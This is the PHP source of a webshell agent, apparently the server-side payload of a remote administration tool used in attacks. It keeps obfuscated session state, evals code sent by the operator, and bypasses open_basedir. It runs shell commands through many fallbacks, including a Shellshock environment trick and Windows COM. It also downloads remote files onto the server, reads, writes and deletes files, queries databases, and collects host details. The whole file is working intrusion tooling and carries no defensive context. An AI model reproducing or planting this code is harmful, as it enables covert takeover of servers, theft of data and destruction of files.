$parameters=array();
$_SES=array();
function run($pms){
    reDefSystemFunc();
    $_SES=&getSession();
    @session_start();
    $sessioId=md5(session_id());
    if (isset($_SESSION[$sessioId])){
        $_SES=unserialize((S1MiwYYr(base64Decode($_SESSION[$sessioId],$sessioId),$sessioId)));
    }
    @session_write_close();

    if (canCallGzipDecode()==1&&@isGzipStream($pms)){
        $pms=gzdecode($pms);
    }
    formatParameter($pms);

    if (isset($_SES["bypass_open_basedir"])&&$_SES["bypass_open_basedir"]==true){
        @bypass_open_basedir();
    }

    $result=evalFunc();

    if ($_SES!==null){
        session_start();
        $_SESSION[$sessioId]=base64_encode(S1MiwYYr(serialize($_SES),$sessioId));
        @session_write_close();
    }

    if (canCallGzipEncode()){
        $result=gzencode($result,6);
    }

    return $result;
}
function S1MiwYYr($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $D[$i] = $D[$i]^$K[($i+1)%15];
    }
    return $D;
}
function reDefSystemFunc(){
    if (!function_exists("file_get_contents")) {
        function file_get_contents($file) {
            $f = @fopen($file,"rb");
            $contents = false;
            if ($f) {
                do { $contents .= fgets($f); } while (!feof($f));
            }
            fclose($f);
            return $contents;
        }
    }
    if (!function_exists('gzdecode')&&function_existsEx("gzinflate")) {
        function gzdecode($data)
        {
            return gzinflate(substr($data,10,-8));
        }
    }
}
function &getSession(){
    global $_SES;
    return $_SES;
}
function bypass_open_basedir(){
    @$_FILENAME = @dirname($_SERVER['SCRIPT_FILENAME']);
    $allFiles = @scandir($_FILENAME);
    $cdStatus=false;
    if ($allFiles!=null){
        foreach ($allFiles as $fileName) {
            if ($fileName!="."&&$fileName!=".."){
                if (@is_dir($fileName)){
                    if (@chdir($fileName)===true){
                        $cdStatus=true;
                        break;
                    }
                }
            }

        }
    }
    if(!@file_exists('bypass_open_basedir')&&!$cdStatus){
        @mkdir('bypass_open_basedir');
    }
    if (!$cdStatus){
        @chdir('bypass_open_basedir');
    }
    @ini_set('open_basedir','..');
    @$_FILENAME = @dirname($_SERVER['SCRIPT_FILENAME']);
    @$_path = str_replace("\\",'/',$_FILENAME);
    @$_num = substr_count($_path,'/') + 1;
    $_i = 0;
    while($_i < $_num){
        @chdir('..');
        $_i++;
    }
    @ini_set('open_basedir','/');
    if (!$cdStatus){
        @rmdir($_FILENAME.'/'.'bypass_open_basedir');
    }
}
function formatParameter($pms){
    global $parameters;
    $index=0;
    $key=null;
    while (true){
        $q=$pms[$index];
        if (ord($q)==0x02){
            $len=bytesToInteger(getBytes(substr($pms,$index+1,4)),0);
            $index+=4;
            $value=substr($pms,$index+1,$len);
            $index+=$len;
            $parameters[$key]=$value;
            $key=null;
        }else{
            $key.=$q;
        }
        $index++;
        if ($index>strlen($pms)-1){
            break;
        }
    }
}
function evalFunc(){
    try{
        @session_write_close();
        $className=get("codeName");
        $methodName=get("methodName");
        $_SES=&getSession();
        if ($methodName!=null){
            if (strlen(trim($className))>0){
                if ($methodName=="includeCode"){
                    return includeCode();
                }else{
                    if (isset($_SES[$className])){
                        return eval($_SES[$className]);
                    }else{
                        return "{$className} no load";
                    }
                }
            }else{
                if (function_exists($methodName)){
                    return $methodName();
                }else{
                    return "function {$methodName} not exist";
                }
            }
        }else{
            return "methodName Is Null";
        }
    }catch (Exception $e){
        return "ERROR://".$e -> getMessage();
    }

}
function deleteDir($p){
    $m=@dir($p);
    while(@$f=$m->read()){
        $pf=$p."/".$f;
        @chmod($pf,0777);
        if((is_dir($pf))&&($f!=".")&&($f!="..")){
            deleteDir($pf);
            @rmdir($pf);
        }else if (is_file($pf)&&($f!=".")&&($f!="..")){
            @unlink($pf);
        }
    }
    $m->close();
    @chmod($p,0777);
    return @rmdir($p);
}
function deleteFile(){
    $F=get("fileName");
    if(is_dir($F)){
        return deleteDir($F)?"ok":"fail";
    }else{
        return (file_exists($F)?@unlink($F)?"ok":"fail":"fail");
    }
}
function setFileAttr(){
    $type = get("type");
    $attr = get("attr");
    $fileName = get("fileName");
    $ret = "Null";
    if ($type!=null&&$attr!=null&&$fileName!=null) {
        if ($type=="fileBasicAttr"){
            if (@chmod($fileName,convertFilePermissions($attr))){
                return "ok";
            }else{
                return "fail";
            }
        }else if ($type=="fileTimeAttr"){
            if (@touch($fileName,$attr)){
                return "ok";
            }else{
                return "fail";
            }
        }else{
            return "no ExcuteType";
        }
    }else{
        $ret="type or attr or fileName is null";
    }
    return $ret;
}
function fileRemoteDown(){
    $url=get("url");
    $saveFile=get("saveFile");
    if ($url!=null&&$saveFile!=null) {
        $data=@file_get_contents($url);
        if ($data!==false){
            if (@file_put_contents($saveFile,$data)!==false){
                @chmod($saveFile,0777);
                return "ok";
            }else{
                return "write fail";
            }
        }else{
            return "read fail";
        }
    }else{
        return "url or saveFile is null";
    }
}
function copyFile(){
    $srcFileName=get("srcFileName");
    $destFileName=get("destFileName");
    if (@is_file($srcFileName)){
        if (copy($srcFileName,$destFileName)){
            return "ok";
        }else{
            return "fail";
        }
    }else{
        return "The target does not exist or is not a file";
    }
}
function moveFile(){
    $srcFileName=get("srcFileName");
    $destFileName=get("destFileName");
    if (rename($srcFileName,$destFileName)){
        return "ok";
    }else{
        return "fail";
    }

}
function getBasicsInfo()
{
    $data = array();
    $data['OsInfo'] = @php_uname();
    $data['CurrentUser'] = @get_current_user();
    $data['CurrentUser'] = strlen(trim($data['CurrentUser'])) > 0 ? $data['CurrentUser'] : 'NULL';
    $data['REMOTE_ADDR'] = @$_SERVER['REMOTE_ADDR'];
    $data['REMOTE_PORT'] = @$_SERVER['REMOTE_PORT'];
    $data['HTTP_X_FORWARDED_FOR'] = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $data['HTTP_CLIENT_IP'] = @$_SERVER['HTTP_CLIENT_IP'];
    $data['SERVER_ADDR'] = @$_SERVER['SERVER_ADDR'];
    $data['SERVER_NAME'] = @$_SERVER['SERVER_NAME'];
    $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT'];
    $data['disable_functions'] = @ini_get('disable_functions');
    $data['disable_functions'] = strlen(trim($data['disable_functions'])) > 0 ? $data['disable_functions'] : @get_cfg_var('disable_functions');
    $data['Open_basedir'] = @ini_get('open_basedir');
    $data['timezone'] = @ini_get('date.timezone');
    $data['encode'] = @ini_get('exif.encode_unicode');
    $data['extension_dir'] = @ini_get('extension_dir');
    $data['sys_get_temp_dir'] = @sys_get_temp_dir();
    $data['include_path'] = @ini_get('include_path');
    $data['DOCUMENT_ROOT'] = $_SERVER['DOCUMENT_ROOT'];
    $data['PHP_SAPI'] = PHP_SAPI;
    $data['PHP_VERSION'] = PHP_VERSION;
    $data['PHP_INT_SIZE'] = PHP_INT_SIZE;
    $data['canCallGzipDecode'] = canCallGzipDecode();
    $data['canCallGzipEncode'] = canCallGzipEncode();
    $data['session_name'] = @ini_get("session.name");
    $data['session_save_path'] = @ini_get("session.save_path");
    $data['session_save_handler'] = @ini_get("session.save_handler");
    $data['session_serialize_handler'] = @ini_get("session.serialize_handler");
    $data['user_ini_filename'] = @ini_get("user_ini.filename");
    $data['memory_limit'] = @ini_get('memory_limit');
    $data['upload_max_filesize'] = @ini_get('upload_max_filesize');
    $data['post_max_size'] = @ini_get('post_max_size');
    $data['max_execution_time'] = @ini_get('max_execution_time');
    $data['max_input_time'] = @ini_get('max_input_time');
    $data['default_socket_timeout'] = @ini_get('default_socket_timeout');
    $data['mygid'] = @getmygid();
    $data['mypid'] = @getmypid();
    $data['SERVER_SOFTWAREypid'] = @$_SERVER['SERVER_SOFTWARE'];
    $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT'];
    $data['loaded_extensions'] = @implode(',', @get_loaded_extensions());
    $data['short_open_tag'] = @get_cfg_var('short_open_tag');
    $data['short_open_tag'] = @(int)$data['short_open_tag'] == 1 ? 'true' : 'false';
    $data['asp_tags'] = @get_cfg_var('asp_tags');
    $data['asp_tags'] = (int)$data['asp_tags'] == 1 ? 'true' : 'false';
    $data['safe_mode'] = @get_cfg_var('safe_mode');
    $data['safe_mode'] = (int)$data['safe_mode'] == 1 ? 'true' : 'false';
    $data['CurrentDir'] = str_replace('\\', '/', @dirname($_SERVER['SCRIPT_FILENAME']));
    $SCRIPT_FILENAME=@dirname($_SERVER['SCRIPT_FILENAME']);
    $data['FileRoot'] = '';
    if (substr($SCRIPT_FILENAME, 0, 1) != '/') {foreach (range('A', 'Z') as $L){ if (@is_dir("{$L}:")){ $data['FileRoot'] .= "{$L}:/;";}};};
    $data['FileRoot'] = (strlen(trim($data['FileRoot'])) > 0 ? $data['FileRoot'] : '/');
    $data['FileRoot']= substr_count($data['FileRoot'],substr($SCRIPT_FILENAME, 0, 1))<=0?substr($SCRIPT_FILENAME, 0, 1).":/":$data['FileRoot'];
    $result="";
    foreach($data as $key=>$value){
        $result.=$key." : ".$value."\n";
    }
    return $result;
}
function getFile(){
    $dir=get('dirName');
    $dir=(strlen(@trim($dir))>0)?trim($dir):str_replace('\\','/',dirname(__FILE__));
    $dir.="/";
    $path=$dir;
    $allFiles = @scandir($path);
    $data="";
    if ($allFiles!=null){
        $data.="ok";
        $data.="\n";
        $data.=$path;
        $data.="\n";
        foreach ($allFiles as $fileName) {
            if ($fileName!="."&&$fileName!=".."){
                $fullPath = $path.$fileName;
                $lineData=array();
                array_push($lineData,$fileName);
                array_push($lineData,@is_file($fullPath)?"1":"0");
                array_push($lineData,date("Y-m-d H:i:s", @filemtime($fullPath)));
                array_push($lineData,@filesize($fullPath));
                $fr=(@is_readable($fullPath)?"R":"").(@is_writable($fullPath)?"W":"").(@is_executable($fullPath)?"X":"");
                array_push($lineData,(strlen($fr)>0?$fr:"F"));
                $data.=(implode("\t",$lineData)."\n");
            }

        }
    }else{
        return "Path Not Found Or No Permission!";
    }
    return $data;
}
function readFileContent(){
    $fileName=get("fileName");
    if (@is_file($fileName)){
        if (@is_readable($fileName)){
            return file_get_contents($fileName);
        }else{
            return "No Permission!";
        }
    }else{
        return "File Not Found";
    }
}
function uploadFile(){
    $fileName=get("fileName");
    $fileValue=get("fileValue");
    if (@file_put_contents($fileName,$fileValue)!==false){
        @chmod($fileName,0777);
        return "ok";
    }else{
        return "fail";
    }
}
function newDir(){
    $dir=get("dirName");
    if (@mkdir($dir,0777,true)!==false){
        return "ok";
    }else{
        return "fail";
    }
}
function newFile(){
    $fileName=get("fileName");
    if (@file_put_contents($fileName,"")!==false){
        return "ok";
    }else{
        return "fail";
    }
}

function function_existsEx($functionName){
    $d=explode(",",@ini_get("disable_functions"));
    if(empty($d)){
        $d=array();
    }else{
        $d=array_map('trim',array_map('strtolower',$d));
    }
    return(function_exists($functionName)&&is_callable($functionName)&&!in_array($functionName,$d));
}

function execCommand(){
    @ob_start();
    $cmdLine=get("cmdLine");
    $d=__FILE__;
    $cmdLine=substr($d,0,1)=="/"?"-c \"{$cmdLine}\"":"/c \"{$cmdLine}\"";
    if(substr($d,0,1)=="/"){
        @putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
    }else{
        @putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
    }
    $executeFile=substr($d,0,1)=="/"?"sh":"cmd";

    $cmdLine="{$executeFile} {$cmdLine}";
    $cmdLine=$cmdLine." 2>&1";
    $ret=0;

    if (!function_exists("runshellshock")){
        function runshellshock($d, $c) {
            if (substr($d, 0, 1) == "/" && function_existsEx('putenv') && (function_existsEx('error_log') || function_existsEx('mail'))) {
                if (strstr(readlink("/bin/sh"), "bash") != FALSE) {
                    $tmp = tempnam(sys_get_temp_dir(), 'as');
                    putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
                    if (function_existsEx('error_log')) {
                        error_log("a", 1);
                    } else {
                        mail("a@127.0.0.1", "", "", "-bv");
                    }
                } else {
                    return False;
                }
                $output = @file_get_contents($tmp);
                @unlink($tmp);
                if ($output != "") {
                    print($output);
                    return True;
                }
            }
            return False;
        };
    }

    if(function_existsEx('system')){
        @system($cmdLine,$ret);
    }elseif(function_existsEx('passthru')){
        @passthru($cmdLine,$ret);
    }elseif(function_existsEx('shell_exec')){
        print(@shell_exec($cmdLine));
    }elseif(function_existsEx('exec')){
        @exec($cmdLine,$o,$ret);
        print(join("\n",$o));
    }elseif(function_existsEx('popen')){
        $fp=@popen($cmdLine,'r');
        while(!@feof($fp)){
            print(@fgets($fp,2048));
        }
        @pclose($fp);
    }elseif(function_existsEx('proc_open')){
        $p = @proc_open($cmdLine, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
        while(!@feof($io[1])){
            print(@fgets($io[1],2048));
        }
        while(!@feof($io[2])){
            print(@fgets($io[2],2048));
        }
        @fclose($io[1]);
        @fclose($io[2]);
        @proc_close($p);
    }elseif(runshellshock($d, $cmdLine)) {
        print($ret);
    }elseif(substr($d,0,1)!="/" && @class_exists("COM")){
        $w=new COM('WScript.shell');
        $e=$w->exec($cmdLine);
        $so=$e->StdOut();
        print($so->ReadAll());
        $se=$e->StdErr();
        print($se->ReadAll());
    }else{
        return "none of proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock is available";
    }
    print(($ret!=0)?"ret={$ret}":"");
    $result = @ob_get_contents();
    @ob_end_clean();
    return $result;
}
function execSql(){
    $dbType=get("dbType");
    $dbHost=get("dbHost");
    $dbPort=get("dbPort");
    $username=get("dbUsername");
    $password=get("dbPassword");
    $execType=get("execType");
    $execSql=get("execSql");
    function  mysql_exec($host,$port,$username,$password,$execType,$sql){
        // 创建连接
        $conn = new mysqli($host,$username,$password,"",$port);
        // Check connection
        if ($conn->connect_error) {
            return $conn->connect_error;
        }

        $result = $conn->query($sql);
        if ($conn->error){
            return $conn->error;
        }
        $result = $conn->query($sql);
        if ($execType=="update"){
            return "Query OK, "+$conn->affected_rows+" rows affected";
        }else{
            $data="ok\n";
            while ($column = $result->fetch_field()){
                $data.=base64_encode($column->name)."\t";
            }
            $data.="\n";
            if ($result->num_rows > 0) {
                // 输出数据
                while($row = $result->fetch_assoc()) {
                    foreach ($row as $value){
                        $data.=base64_encode($value)."\t";
                    }
                    $data.="\n";
                }
            }
            return $data;
        }
    }
    function pdoExec($databaseType,$host,$port,$username,$password,$execType,$sql){
        try {
            $conn = new PDO("{$databaseType}:host=$host;port={$port};", $username, $password);

            // 设置 PDO 错误模式为异常
            $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

            if ($execType=="update"){
                return "Query OK, "+$conn->exec($sql)+" rows affected";
            }else{
                $data="ok\n";
                $stm=$conn->prepare($sql);
                $stm->execute();
                $row=$stm->fetch(PDO::FETCH_ASSOC);
                $_row="\n";
                foreach (array_keys($row) as $key){
                    $data.=base64_encode($key)."\t";
                    $_row.=base64_encode($row[$key])."\t";
                }
                $data.=$_row."\n";
                while ($row=$stm->fetch(PDO::FETCH_ASSOC)){
                    foreach (array_keys($row) as $key){
                        $data.=base64_encode($row[$key])."\t";
                    }
                    $data.="\n";
                }
                return $data;
            }

        }
        catch(PDOException $e)
        {
            return $e->getMessage();
        }
    }
    if ($dbType=="mysql"){
        if (extension_loaded("mysqli")){
            return mysql_exec($dbHost,$dbPort,$username,$password,$execType,$execSql);
        }else if (extension_loaded("pdo")){
            return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql);
        }else{
            return "no extension";
        }
    }else if (extension_loaded("pdo")){
        return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql);
    }else{
        return "no extension";
    }
    return "no extension";

}
function base64Encode($data){
    return base64_encode($data);
}
function test(){
    return "ok";
}
function get($key){
    global $parameters;
    if (isset($parameters[$key])){
        return $parameters[$key];
    }else{
        return null;
    }
}
function getAllParameters(){
    global $parameters;
    return $parameters;
}
function includeCode(){
    $classCode=get("binCode");
    $codeName=get("codeName");
    $_SES=&getSession();
    $_SES[$codeName]=$classCode;
    return "ok";
}
function base64Decode($string){
    return base64_decode($string);
}
function convertFilePermissions($fileAttr){
    $mod=0;
    if (strpos($fileAttr,'R')!==false){
        $mod=$mod+0444;
    }
    if (strpos($fileAttr,'W')!==false){
        $mod=$mod+0222;
    }
    if (strpos($fileAttr,'X')!==false){
        $mod=$mod+0111;
    }
    return $mod;
}
function close(){
    @session_start();
    $_SES=&getSession();
    $_SES=null;
    if (@session_destroy()){
        return "ok";
    }else{
        return "fail!";
    }
}

function bigFileDownload(){
    $mode=get("mode");
    $fileName=get("fileName");
    $readByteNum=get("readByteNum");
    $position=get("position");
    if ($mode=="fileSize"){
        if (@is_readable($fileName)){
            return @filesize($fileName)."";
        }else{
            return "not read";
        }
    }elseif ($mode=="read"){

        if (function_existsEx("fopen")&&function_existsEx("fread")&&function_existsEx("fseek")){
            $handle=fopen($fileName,"ab+");
            fseek($handle,$position);
            $data=fread($handle,$readByteNum);
            @fclose($handle);
            if ($data!==false){
                return $data;
            }else{
                return "cannot read file";
            }
        }else if (function_existsEx("file_get_contents")){
            return file_get_contents($fileName,false,null,$position,$readByteNum);
        }else{
            return "no function";
        }

    }else{
        return "no mode";
    }
}

function bigFileUpload(){
    $fileName=get("fileName");
    $fileContents=get("fileContents");
    $position=get("position");
    if(function_existsEx("fopen")&&function_existsEx("fwrite")&&function_existsEx("fseek")){
        $handle=fopen($fileName,"ab+");
        if ($handle!==false){
            fseek($handle,$position);
            $len=fwrite($handle,$fileContents);
            if ($len!==false){
                return "ok";
            }else{
                return "cannot write file";
            }
            @fclose($handle);
        }else{
            return "cannot open file";
        }
    }else if (function_existsEx("file_put_contents")){
        if (file_put_contents($fileName,$fileContents,FILE_APPEND)!==false){
            return "ok";
        }else{
            return "writer fail";
        }
    }else{
        return "no function";
    }
}
function canCallGzipEncode(){
    if (function_existsEx("gzencode")){
        return "1";
    }else{
        return "0";
    }
}
function canCallGzipDecode(){
    if (function_existsEx("gzdecode")){
        return "1";
    }else{
        return "0";
    }
}
function bytesToInteger($bytes, $position) {
    $val = 0;
    $val = $bytes[$position + 3] & 0xff;
    $val <<= 8;
    $val |= $bytes[$position + 2] & 0xff;
    $val <<= 8;
    $val |= $bytes[$position + 1] & 0xff;
    $val <<= 8;
    $val |= $bytes[$position] & 0xff;
    return $val;
}
function isGzipStream($bin){
    if (strlen($bin)>=2){
        $bin=substr($bin,0,2);
        $strInfo = @unpack("C2chars", $bin);
        $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);
        switch ($typeCode) {
            case 31139:
                return true;
                break;
            default:
                return false;
        }
    }else{
        return false;
    }
}
function getBytes($string) {
    $bytes = array();
    for($i = 0; $i < strlen($string); $i++){
        array_push($bytes,ord($string[$i]));
    }
    return $bytes;
}
